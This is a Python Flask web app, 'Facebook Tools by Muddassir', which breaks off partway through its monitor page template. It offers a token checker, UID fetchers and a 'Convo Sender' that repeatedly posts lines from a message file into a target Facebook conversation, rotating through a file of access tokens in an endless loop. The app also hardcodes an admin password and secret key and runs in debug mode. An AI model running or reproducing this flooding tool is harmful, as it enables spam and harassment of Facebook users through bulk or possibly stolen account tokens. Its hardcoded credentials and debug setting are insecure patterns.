from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for
import requests
from threading import Thread, Event
import time
import random
import string
import os
import json
import psutil
from datetime import datetime
import hashlib
from analytics import analytics
from monitor import system_monitor

app = Flask(__name__)
app.secret_key = 'muddassir_secret_key_2025'
app.debug = True

# Admin credentials
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "muddassir123"

# Global variables for monitoring
active_users = set()
deployed_count = 0
message_count = 0
start_time = datetime.now()

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def send_notification_to_admin(user_info):
    """Send notification to admin about new user"""
    try:
        # Use analytics to send notification
        analytics.send_admin_notification(f"New user activity: {user_info}", user_info)
    except Exception as e:
        print(f"Failed to send notification: {e}")

def check_token_validity(token):
    """Check if Facebook token is valid"""
    try:
        url = f"https://graph.facebook.com/me?access_token={token}"
        response = requests.get(url)
        if response.status_code == 200:
            return True, response.json()
        else:
            return False, None
    except:
        return False, None

def get_facebook_uid(token):
    """Get Facebook UID from token"""
    try:
        url = f"https://graph.facebook.com/me?access_token={token}"
        response = requests.get(url)
        if response.status_code == 200:
            return response.json().get('id')
        return None
    except:
        return None

def get_post_uid(post_url):
    """Extract UID from Facebook post URL"""
    try:
        # Simple extraction logic for post UID
        if 'posts/' in post_url:
            return post_url.split('posts/')[-1].split('?')[0]
        elif 'story_fbid=' in post_url:
            return post_url.split('story_fbid=')[-1].split('&')[0]
        return None
    except:
        return None

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    global message_count
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    message_count += 1
                    print(f"Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"Message Sent Failed From token {access_token}: {message}")
                time.sleep(time_interval)

@app.route('/')
def index():
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to Facebook Tools</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: url('{{ url_for("static", filename="goku_bg.jpg") }}') no-repeat center center fixed;
            background-size: cover;
            font-family: 'Arial', sans-serif;
            color: white;
            overflow: hidden;
        }
        
        .welcome-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: rgba(0, 0, 0, 0.7);
        }
        
        .welcome-text {
            text-align: center;
            animation: fadeInUp 2s ease-in-out;
        }
        
        .welcome-text h1 {
            font-size: 4rem;
            margin: 0;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4, #feca57);
            background-size: 300% 300%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gradientShift 3s ease-in-out infinite;
        }
        
        .welcome-text p {
            font-size: 1.5rem;
            margin: 20px 0;
            animation: pulse 2s infinite;
        }
        
        .enter-btn {
            background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
            border: none;
            padding: 15px 30px;
            font-size: 1.2rem;
            color: white;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            animation: bounce 2s infinite;
        }
        
        .enter-btn:hover {
            transform: scale(1.1);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
        }
        
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
        
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-10px); }
            60% { transform: translateY(-5px); }
        }
    </style>
</head>
<body>
    <div class="welcome-container">
        <div class="welcome-text">
            <h1>Welcome to My Tool</h1>
            <p>Facebook Tools by Muddassir</p>
            <button class="enter-btn" onclick="window.location.href='/login'">Enter</button>
        </div>
    </div>
</body>
</html>
    ''')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('dashboard'))
        else:
            return render_template_string(login_template, error="Invalid credentials!")
    
    return render_template_string(login_template)

login_template = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: url('{{ url_for("static", filename="goku_bg.jpg") }}') no-repeat center center fixed;
            background-size: cover;
            font-family: 'Arial', sans-serif;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.8);
        }
        
        .login-container {
            background: rgba(0, 0, 0, 0.8);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(255, 255, 255, 0.3);
            text-align: center;
            animation: slideIn 1s ease-out;
        }
        
        .login-container h2 {
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 2.5rem;
            margin-bottom: 30px;
        }
        
        .form-group {
            margin: 20px 0;
        }
        
        .form-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #667eea;
            border-radius: 10px;
            background: transparent;
            color: white;
            font-size: 1.1rem;
        }
        
        .form-group input::placeholder {
            color: #ccc;
        }
        
        .login-btn {
            background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
            border: none;
            padding: 15px 40px;
            font-size: 1.2rem;
            color: white;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
        }
        
        .login-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
        }
        
        .error {
            color: #ff6b6b;
            margin-top: 10px;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Enter Username and Password</h2>
        <form method="post">
            <div class="form-group">
                <input type="text" name="username" placeholder="Username" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-btn">Login</button>
            {% if error %}
                <div class="error">{{ error }}</div>
            {% endif %}
        </form>
    </div>
</body>
</html>
'''

@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    # Track user activity
    analytics.track_user_activity(request.remote_addr, 'dashboard_access')
    analytics.add_active_session(request.remote_addr, {'username': session.get('username')})
    
    # Get analytics stats
    stats = analytics.get_stats()
    
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to Facebook Tools</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body {
            background: url('{{ url_for("static", filename="goku_bg.jpg") }}') no-repeat center center fixed;
            background-size: cover;
            color: white;
            font-family: 'Arial', sans-serif;
        }
        
        .overlay {
            background: rgba(0, 0, 0, 0.8);
            min-height: 100vh;
            padding: 20px 0;
        }
        
        .welcome-header {
            text-align: center;
            margin-bottom: 30px;
            animation: fadeInDown 1s ease-out;
        }
        
        .welcome-header h1 {
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4, #feca57);
            background-size: 300% 300%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gradientShift 3s ease-in-out infinite;
            font-size: 3rem;
            margin-bottom: 10px;
        }
        
        .stats-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            animation: slideInUp 1s ease-out;
        }
        
        .stat-card i {
            font-size: 2.5rem;
            margin-bottom: 10px;
            color: #4ecdc4;
        }
        
        .stat-card h3 {
            font-size: 2rem;
            margin: 10px 0;
            color: #feca57;
        }
        
        .tools-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 30px;
        }
        
        .tool-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 25px;
            text-align: center;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            transition: all 0.3s ease;
            animation: fadeInUp 1s ease-out;
        }
        
        .tool-card:hover {
            transform: translateY(-10px);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
        }
        
        .tool-card i {
            font-size: 3rem;
            margin-bottom: 15px;
            color: #667eea;
        }
        
        .tool-card h4 {
            color: #4ecdc4;
            margin-bottom: 15px;
        }
        
        .tool-btn {
            background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
            border: none;
            padding: 12px 25px;
            color: white;
            border-radius: 25px;
            text-decoration: none;
            display: inline-block;
            transition: all 0.3s ease;
        }
        
        .tool-btn:hover {
            transform: scale(1.05);
            color: white;
            text-decoration: none;
        }
        
        @keyframes fadeInDown {
            from { opacity: 0; transform: translateY(-30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes slideInUp {
            from { opacity: 0; transform: translateY(50px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
    </style>
</head>
<body>
    <div class="overlay">
        <div class="container">
            <div class="welcome-header">
                <h1>Welcome to Facebook Tools</h1>
                <p class="lead">Complete Facebook Automation Suite by Muddassir</p>
            </div>
            
            <div class="stats-container">
                <div class="stat-card">
                    <i class="fas fa-users"></i>
                    <h3>{{ active_users_count }}</h3>
                    <p>Active Users</p>
                </div>
                <div class="stat-card">
                    <i class="fas fa-paper-plane"></i>
                    <h3>{{ message_count }}</h3>
                    <p>Messages Sent</p>
                </div>
                <div class="stat-card">
                    <i class="fas fa-rocket"></i>
                    <h3>{{ deployed_count }}</h3>
                    <p>Deployments</p>
                </div>
                <div class="stat-card">
                    <i class="fas fa-clock"></i>
                    <h3>{{ uptime }}</h3>
                    <p>Uptime (Hours)</p>
                </div>
            </div>
            
            <div class="tools-grid">
                <div class="tool-card">
                    <i class="fas fa-check-circle"></i>
                    <h4>Token Checker</h4>
                    <p>Validate Facebook access tokens</p>
                    <a href="/token-checker" class="tool-btn">Use Tool</a>
                </div>
                
                <div class="tool-card">
                    <i class="fas fa-id-card"></i>
                    <h4>UID Fetcher</h4>
                    <p>Extract Facebook user and post UIDs</p>
                    <a href="/uid-fetcher" class="tool-btn">Use Tool</a>
                </div>
                
                <div class="tool-card">
                    <i class="fas fa-comments"></i>
                    <h4>Convo Sender</h4>
                    <p>Send messages to Facebook conversations</p>
                    <a href="/convo-sender" class="tool-btn">Use Tool</a>
                </div>
                
                <div class="tool-card">
                    <i class="fab fa-whatsapp"></i>
                    <h4>WhatsApp Server</h4>
                    <p>WhatsApp messaging server</p>
                    <a href="/whatsapp-server" class="tool-btn">Use Tool</a>
                </div>
                
                <div class="tool-card">
                    <i class="fas fa-users"></i>
                    <h4>Group UID Fetcher</h4>
                    <p>Get Facebook group UIDs</p>
                    <a href="/group-uid-fetcher" class="tool-btn">Use Tool</a>
                </div>
                
                <div class="tool-card">
                    <i class="fas fa-chart-line"></i>
                    <h4>Monitor</h4>
                    <p>System monitoring and analytics</p>
                    <a href="/monitor" class="tool-btn">Use Tool</a>
                </div>
            </div>
            
            <div class="text-center mt-4">
                <p>Admin: +923243037456 | Facebook: <a href="https://www.facebook.com/muddassir.OP" target="_blank">muddassir.OP</a></p>
                <a href="/logout" class="btn btn-danger">Logout</a>
            </div>
        </div>
    </div>
</body>
</html>
    ''', 
    active_users_count=stats['active_users'],
    message_count=stats['total_messages'],
    deployed_count=stats['total_deployments'],
    uptime=stats['uptime']
    )

@app.route('/token-checker', methods=['GET', 'POST'])
def token_checker():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    result = None
    if request.method == 'POST':
        token = request.form.get('token')
        is_valid, user_data = check_token_validity(token)
        result = {
            'valid': is_valid,
            'data': user_data
        }
    
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Checker</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: url('{{ url_for("static", filename="goku_bg.jpg") }}') no-repeat center center fixed;
            background-size: cover;
            color: white;
            min-height: 100vh;
        }
        .overlay {
            background: rgba(0, 0, 0, 0.8);
            min-height: 100vh;
            padding: 50px 0;
        }
        .container {
            max-width: 600px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 40px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        .form-control {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.3);
            color: white;
        }
        .form-control::placeholder {
            color: #ccc;
        }
        .btn-primary {
            background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
            border: none;
        }
        .result-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 20px;
            margin-top: 20px;
        }
        .valid { border-left: 5px solid #28a745; }
        .invalid { border-left: 5px solid #dc3545; }
    </style>
</head>
<body>
    <div class="overlay">
        <div class="container">
            <h2 class="text-center mb-4">Facebook Token Checker</h2>
            <form method="post">
                <div class="mb-3">
                    <label for="token" class="form-label">Enter Facebook Access Token</label>
                    <textarea class="form-control" id="token" name="token" rows="3" placeholder="Paste your Facebook access token here..." required></textarea>
                </div>
                <button type="submit" class="btn btn-primary w-100">Check Token</button>
            </form>
            
            {% if result %}
            <div class="result-card {% if result.valid %}valid{% else %}invalid{% endif %}">
                <h5>{% if result.valid %}✅ Token is Valid{% else %}❌ Token is Invalid{% endif %}</h5>
                {% if result.valid and result.data %}
                <p><strong>Name:</strong> {{ result.data.name }}</p>
                <p><strong>ID:</strong> {{ result.data.id }}</p>
                {% endif %}
            </div>
            {% endif %}
            
            <div class="text-center mt-4">
                <a href="/dashboard" class="btn btn-secondary">Back to Dashboard</a>
            </div>
        </div>
    </div>
</body>
</html>
    ''', result=result)

@app.route('/uid-fetcher', methods=['GET', 'POST'])
def uid_fetcher():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    result = None
    if request.method == 'POST':
        fetch_type = request.form.get('fetch_type')
        
        if fetch_type == 'user':
            token = request.form.get('token')
            uid = get_facebook_uid(token)
            result = {'type': 'user', 'uid': uid}
        elif fetch_type == 'post':
            post_url = request.form.get('post_url')
            uid = get_post_uid(post_url)
            result = {'type': 'post', 'uid': uid}
    
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UID Fetcher</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: url('{{ url_for("static", filename="goku_bg.jpg") }}') no-repeat center center fixed;
            background-size: cover;
            color: white;
            min-height: 100vh;
        }
        .overlay {
            background: rgba(0, 0, 0, 0.8);
            min-height: 100vh;
            padding: 50px 0;
        }
        .container {
            max-width: 600px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 40px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        .form-control, .form-select {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.3);
            color: white;
        }
        .form-control::placeholder {
            color: #ccc;
        }
        .btn-primary {
            background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
            border: none;
        }
        .result-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 20px;
            margin-top: 20px;
            border-left: 5px solid #28a745;
        }
    </style>
</head>
<body>
    <div class="overlay">
        <div class="container">
            <h2 class="text-center mb-4">Facebook UID Fetcher</h2>
            <form method="post">
                <div class="mb-3">
                    <label for="fetch_type" class="form-label">Select Fetch Type</label>
                    <select class="form-select" id="fetch_type" name="fetch_type" onchange="toggleInputs()" required>
                        <option value="">Choose...</option>
                        <option value="user">User UID from Token</option>
                        <option value="post">Post UID from URL</option>
                    </select>
                </div>
                
                <div class="mb-3" id="token_input" style="display: none;">
                    <label for="token" class="form-label">Enter Facebook Access Token</label>
                    <textarea class="form-control" id="token" name="token" rows="3" placeholder="Paste your Facebook access token here..."></textarea>
                </div>
                
                <div class="mb-3" id="post_input" style="display: none;">
                    <label for="post_url" class="form-label">Enter Facebook Post URL</label>
                    <input type="url" class="form-control" id="post_url" name="post_url" placeholder="https://facebook.com/...">
                </div>
                
                <button type="submit" class="btn btn-primary w-100">Fetch UID</button>
            </form>
            
            {% if result %}
            <div class="result-card">
                <h5>✅ UID Fetched Successfully</h5>
                <p><strong>Type:</strong> {{ result.type|title }}</p>
                <p><strong>UID:</strong> {{ result.uid or 'Not found' }}</p>
            </div>
            {% endif %}
            
            <div class="text-center mt-4">
                <a href="/dashboard" class="btn btn-secondary">Back to Dashboard</a>
            </div>
        </div>
    </div>
    
    <script>
        function toggleInputs() {
            const fetchType = document.getElementById('fetch_type').value;
            const tokenInput = document.getElementById('token_input');
            const postInput = document.getElementById('post_input');
            
            if (fetchType === 'user') {
                tokenInput.style.display = 'block';
                postInput.style.display = 'none';
            } else if (fetchType === 'post') {
                tokenInput.style.display = 'none';
                postInput.style.display = 'block';
            } else {
                tokenInput.style.display = 'none';
                postInput.style.display = 'none';
            }
        }
    </script>
</body>
</html>
    ''', result=result)

@app.route('/convo-sender', methods=['GET', 'POST'])
def convo_sender():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        # Send notification to admin
        send_notification_to_admin(f"New convo task started: {task_id}")

        return f'Task started with ID: {task_id}'

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Convo Sender - Muddassir Tools</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    body {
      background: url('{{ url_for("static", filename="goku_bg.jpg") }}') no-repeat center center fixed;
      background-size: cover;
      color: white;
      min-height: 100vh;
    }
    .overlay {
      background: rgba(0, 0, 0, 0.8);
      min-height: 100vh;
      padding: 20px 0;
    }
    .container {
      max-width: 500px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      padding: 30px;
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.2);
      box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
    }
    .form-control, .form-select {
      background: rgba(255, 255, 255, 0.1);
      border: 1px solid rgba(255, 255, 255, 0.3);
      color: white;
      border-radius: 10px;
    }
    .form-control::placeholder {
      color: #ccc;
    }
    .btn-primary {
      background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
      border: none;
      border-radius: 25px;
    }
    .btn-danger {
      background: linear-gradient(45deg, #ff6b6b 0%, #ee5a52 100%);
      border: none;
      border-radius: 25px;
    }
    .header {
      text-align: center;
      margin-bottom: 30px;
    }
    .header h1 {
      background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      font-size: 2.5rem;
    }
    .footer {
      text-align: center;
      margin-top: 30px;
      color: #ccc;
    }
    .whatsapp-link {
      color: #25d366;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="overlay">
    <div class="container">
      <div class="header">
        <h1>Convo Sender</h1>
        <p>Send messages to Facebook conversations</p>
      </div>
      
      <form method="post" enctype="multipart/form-data">
        <div class="mb-3">
          <label for="tokenOption" class="form-label">Select Token Option</label>
          <select class="form-select" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
            <option value="single">Single Token</option>
            <option value="multiple">Token File</option>
          </select>
        </div>
        
        <div class="mb-3" id="singleTokenInput">
          <label for="singleToken" class="form-label">Enter Single Token</label>
          <textarea class="form-control" id="singleToken" name="singleToken" rows="3" placeholder="Paste your token here..."></textarea>
        </div>
        
        <div class="mb-3" id="tokenFileInput" style="display: none;">
          <label for="tokenFile" class="form-label">Choose Token File</label>
          <input type="file" class="form-control" id="tokenFile" name="tokenFile">
        </div>
        
        <div class="mb-3">
          <label for="threadId" class="form-label">Enter Inbox/Convo UID</label>
          <input type="text" class="form-control" id="threadId" name="threadId" required>
        </div>
        
        <div class="mb-3">
          <label for="kidx" class="form-label">Enter Your Name</label>
          <input type="text" class="form-control" id="kidx" name="kidx" required>
        </div>
        
        <div class="mb-3">
          <label for="time" class="form-label">Enter Time Interval (seconds)</label>
          <input type="number" class="form-control" id="time" name="time" required>
        </div>
        
        <div class="mb-3">
          <label for="txtFile" class="form-label">Choose Message File</label>
          <input type="file" class="form-control" id="txtFile" name="txtFile" required>
        </div>
        
        <button type="submit" class="btn btn-primary w-100 mb-3">Start Sending</button>
      </form>
      
      <form method="post" action="/stop">
        <div class="mb-3">
          <label for="taskId" class="form-label">Enter Task ID to Stop</label>
          <input type="text" class="form-control" id="taskId" name="taskId" required>
        </div>
        <button type="submit" class="btn btn-danger w-100">Stop Task</button>
      </form>
      
      <div class="footer">
        <p>© 2025 Developed by Muddassir</p>
        <a href="https://wa.me/+923243037456" class="whatsapp-link">
          <i class="fab fa-whatsapp"></i> Chat on WhatsApp
        </a>
        <div class="mt-3">
          <a href="/dashboard" class="btn btn-secondary">Back to Dashboard</a>
        </div>
      </div>
    </div>
  </div>
  
  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption == 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
  </script>
</body>
</html>
''')

@app.route('/group-uid-fetcher', methods=['GET', 'POST'])
def group_uid_fetcher():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    groups = []
    if request.method == "POST":
        token = request.form.get("token")
        try:
            url = f"https://graph.facebook.com/v15.0/me/conversations?fields=id,name&access_token={token}"
            res = requests.get(url).json()

            if "data" in res:
                groups = res["data"]
            else:
                groups = [{"name": "❌ Error", "id": res.get("error", {}).get("message", "Invalid Token")}]
        except Exception as e:
            groups = [{"name": "❌ Exception", "id": str(e)}]

    return render_template_string('''
<!DOCTYPE html>
<html>
<head>
    <title>Group UID Fetcher</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: url('{{ url_for("static", filename="goku_bg.jpg") }}') no-repeat center center fixed;
            background-size: cover;
            color: white;
            min-height: 100vh;
        }
        .overlay {
            background: rgba(0, 0, 0, 0.8);
            min-height: 100vh;
            padding: 50px 0;
        }
        .container {
            max-width: 800px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 40px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        .form-control {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.3);
            color: white;
        }
        .form-control::placeholder {
            color: #ccc;
        }
        .btn-primary {
            background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
            border: none;
        }
        .table-dark {
            background: rgba(0, 0, 0, 0.5);
        }
    </style>
</head>
<body>
    <div class="overlay">
        <div class="container">
            <h1 class="text-center mb-4">📌 Group UID Fetcher</h1>
            <form method="POST" class="mb-4">
                <div class="mb-3">
                    <label for="token" class="form-label">Enter Access Token:</label>
                    <textarea class="form-control" id="token" name="token" rows="3" placeholder="Paste your Facebook access token here..." required></textarea>
                </div>
                <button type="submit" class="btn btn-primary w-100">Fetch Groups</button>
            </form>

            {% if groups %}
            <h3>✅ Groups Found:</h3>
            <div class="table-responsive">
                <table class="table table-dark table-bordered mt-3">
                    <thead>
                        <tr>
                            <th>Group Name</th>
                            <th>Group UID</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for g in groups %}
                        <tr>
                            <td>{{ g.name }}</td>
                            <td>{{ g.id }}</td>
                        </tr>
                        {% endfor %}
                    </tbody>
                </table>
            </div>
            {% endif %}
            
            <div class="text-center mt-4">
                <a href="/dashboard" class="btn btn-secondary">Back to Dashboard</a>
            </div>
        </div>
    </div>
</body>
</html>
    ''', groups=groups)

@app.route('/whatsapp-server')
def whatsapp_server():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Server</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: url('{{ url_for("static", filename="goku_bg.jpg") }}') no-repeat center center fixed;
            background-size: cover;
            color: white;
            min-height: 100vh;
        }
        .overlay {
            background: rgba(0, 0, 0, 0.8);
            min-height: 100vh;
            padding: 50px 0;
        }
        .container {
            max-width: 600px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 40px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
    </style>
</head>
<body>
    <div class="overlay">
        <div class="container text-center">
            <h2 class="mb-4">WhatsApp Server</h2>
            <div class="alert alert-info">
                <h5>🚧 Under Development</h5>
                <p>WhatsApp server functionality is being developed. This will include:</p>
                <ul class="text-start">
                    <li>WhatsApp Web automation</li>
                    <li>Bulk message sending</li>
                    <li>Contact management</li>
                    <li>Message scheduling</li>
                </ul>
            </div>
            <a href="/dashboard" class="btn btn-secondary">Back to Dashboard</a>
        </div>
    </div>
</body>
</html>
    ''')

@app.route('/monitor')
def monitor():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    # Track user activity
    analytics.track_user_activity(request.remote_addr, 'monitor_access')
    
    # Get monitoring data
    monitoring_summary = system_monitor.get_monitoring_summary()
    current_stats = monitoring_summary['current_stats']
    analytics_stats = analytics.get_stats()
    
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Monitor</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: url('{{ url_for("static", filename="goku_bg.jpg") }}') no-repeat center center fixed;
            background-size: cover;
            color: white;
            min-height: 100vh;
        }
        .overlay {
            background: rgba(0, 0, 0, 0.8);
            min-height: 100vh;
            padding: 50px 0;
        }
        .container {
            max-width: 800px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 40px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        .stat-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 20px;
            border-left: 5px solid #4ecdc4;
        }
        .progress {
            background: rgba(255, 255, 255, 0.2);
        }
    </style>
</head>
<body>
    <div class="overlay">
        <div class="container">
